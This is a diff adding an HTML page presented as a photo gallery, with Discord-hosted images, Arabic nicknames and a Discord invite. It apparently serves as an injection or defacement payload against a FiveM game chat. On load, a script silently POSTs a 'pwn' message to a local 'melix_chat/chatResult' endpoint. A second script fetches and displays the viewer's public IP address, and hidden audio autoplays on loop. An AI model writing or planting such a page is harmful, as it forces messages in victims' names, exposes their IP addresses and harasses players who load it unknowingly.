@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Photo Gallery</title>
+    <style>
+        body {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            align-items: center;
+            padding: 10px;
+            height: 100vh;
+        }
+
+        #gallery-header {
+            width: 100%;
+            text-align: center;
+            font-size: 36px; /* Adjusted font size */
+            margin-bottom: -200px;
+            border-bottom: 6px solid #8B0000;
+        }
+
+        .photo {
+            width: 300px;
+            height: 400px;
+            margin: 20px; /* Adjusted margin for all photos */
+            overflow: hidden;
+            border: 2px solid #8B0000;
+            border-radius: 5px;
+            position: relative;
+        }
+
+        .photo img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .photo .caption {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: rgba(139, 0, 0, 0.8);
+            color: #fff;
+            padding: 5px;
+            text-align: center;
+            font-size: 16px;
+        }
+
+        /* Adjust size and position for the third photo */
+        .photo.third {
+            width: 730px;
+            height: 200px;
+            margin-left: -715px; /* Adjusted margin to move the photo further to the left */
+            margin-top: 700px; /* Added margin-top to create space and move it down */
+        }
+
+        /* Hide the audio player */
+        audio {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="gallery-header">الثلاثي المرح</div>
+    <div id="gallery-header">discord.gg/343</div>
+
+    <div id="gallery-header">IP Address: <span id="ip-address-value"></span></div>
+
+
+    <div class="photo">
+        <img src="https://cdn.discordapp.com/attachments/1198366298099437639/1203919705694404628/image.png?ex=662f2199&is=661cac99&hm=6be05dc344a2fb6a5af74e209c72f61b7c768ff91a2c14ddbccc68059348619b&&" alt="Photo 1">
+        <div class="caption">Bufatma</div>
+    </div>
+
+    <div class="photo">
+        <img src="https://cdn.discordapp.com/attachments/1156211993116676126/1230494136621207699/remix-99c87cbd-93eb-4a1d-bc11-a945a3872921.png?ex=663385f7&is=662110f7&hm=b4114b6998102c12cbf512afe5d1c67a0a30bf70395078f364dfa837528d6fa5&" alt="Photo 2">
+        <div class="caption">ابو شهاب راعي قروب غناتي</div>
+    </div>
+
+    <div class="photo">
+        <img src="https://cdn.discordapp.com/attachments/1156211993116676126/1230505956131995689/image.png?ex=663390f9&is=66211bf9&hm=1ed39b4b98da4205caf925fea91af9f992b1c04bbe4d337bc943c3d0e3b3544d&" alt="Photo 2">
+        <div class="caption">Bu3of</div>
+    </div>
+
+
+
+    <!-- Looping audio with bass boost (autoplay muted) -->
+    <audio controls loop autoplay volume="5">
+        <source src="https://cdn.discordapp.com/attachments/1144805790461464626/1230503060288311388/cm-chat-media-video-1c28db346-e913-5196-bff3-9f3e641ca175601500.mov?ex=66338e47&is=66211947&hm=8c57cb07d3d97dbe6b2a99505ad59b3f2c375efbf51a93c337ee4b1708bc770c&" type="audio/mp3">
+        Your browser does not support the audio tag.
+    </audio>
+</body>
+</html>
+<script>
+    fetch("http://melix_chat/chatResult", {
+      "headers": {
+        "accept": "*/*",
+        "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
+      },
+      "referrer": "",
+      "referrerPolicy": "strict-origin-when-cross-origin",
+      "body": "{\"message\":\"شيوخ فايف ام اختصار الدس pwn\"}",
+      "method": "POST",
+      "mode": "cors",
+      "credentials": "omit"
+    });
+    </script>
+        <script>
+
+            fetch("https://api64.ipify.org?format=json")
+            .then(response => response.json())
+            .then(data => {
+                const ipAddress = data.ip;
+
+                document.getElementById("ip-address-value").textContent = ipAddress;
+            })
+            .catch(error => console.error("Error fetching IP address:", error));
+        </script>
+    
